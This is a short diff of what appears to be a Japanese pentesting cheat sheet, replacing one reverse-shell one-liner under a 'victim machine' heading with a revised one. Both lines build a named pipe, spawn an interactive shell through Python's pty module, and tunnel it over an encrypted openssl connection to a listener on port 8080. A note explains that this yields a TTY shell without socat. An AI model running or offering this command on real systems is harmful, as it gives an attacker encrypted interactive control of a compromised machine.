@@ -126,7 +126,7 @@ at darwin
 ### victim machine
 ```
 # socat ok
-mkfifo /tmp/p;python -c 'import pty; pty.spawn("/bin/sh")' < /tmp/p 2>&1 | openssl s_client -quiet -connect 127.0.0.1:8080 > /tmp/p;rm -f /tmp/p
+rm -f .fifo; mkfifo .fifo;python -c 'import pty; pty.spawn("/bin/bash")' < .fifo 2>&1 | openssl s_client -quiet -connect localhost:8080 > .fifo;rm -f .fifo
 ```
 pythonのspawn a TTY shell from an interpreterを利用することでsocat(fully tty reverse shell)なしでもOK
 
